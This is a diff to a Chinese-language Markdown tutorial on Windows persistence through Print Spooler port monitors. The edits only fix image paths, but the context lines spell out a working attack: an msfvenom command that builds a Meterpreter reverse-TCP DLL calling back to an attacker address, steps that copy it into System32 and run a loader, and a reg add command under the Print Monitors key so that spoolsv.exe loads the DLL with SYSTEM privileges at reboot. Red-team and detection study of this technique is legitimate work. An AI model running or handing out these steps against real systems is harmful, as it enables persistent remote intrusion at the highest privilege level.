@@ -32,7 +32,7 @@ int main() {
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.188.129 LPORT=4444 -f dll > shell.dll
 ~~~
 
-![test_dll](images\test_dll.png)
+![test_dll](images/test_dll.png)
 
 **Step 3**：将shell.dll复制到目标主机的system32目录下，之后重命名为test.dll(也就是上面的PDLLName，你也可以自己修改为自己喜欢的，总之随意)
 
@@ -40,7 +40,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.188.129 LPORT=4444
 copy C:\temp\shell.dll C:\Windows\System32\test.dll
 ~~~
 
-![copy](images\copy.png)
+![copy](images/copy.png)
 
 **Step 4**：之后进入system32目录，并执行以下命令(Monitors.exe为之前编译好的文件，也需要放置到system32目录下)：
 
@@ -48,11 +48,11 @@ copy C:\temp\shell.dll C:\Windows\System32\test.dll
 Monitors.exe
 ~~~
 
-![Monitor](images\Monitor.png)
+![Monitor](images/Monitor.png)
 
 **Step 5**：之后成功接收到Meterpreter会话
 
-![Meterpreter](images\Meterpreter.png)
+![Meterpreter](images/Meterpreter.png)
 
 #### 持久化实现
 
@@ -68,11 +68,11 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors
 reg add "hklm\system\currentcontrolset\control\print\monitors\Pentestlab" /v "Driver" /d "test.dll" /t REG_SZ
 ~~~
 
-![regedit](images\regedit.png)
+![regedit](images/regedit.png)
 
 下次重新启动时，spoolsv.exe进程将加载Monitors注册表项中存在并存储在Windows文件夹System32中的所有驱动程序DLL文件，下图演示了Meterpreter会话已建立与Print Spooler服务(SYSTEM)相同级别的特权，并且已从System32文件夹执行了
 
-![shell](images\shell.png)
+![shell](images/shell.png)
 
 
 
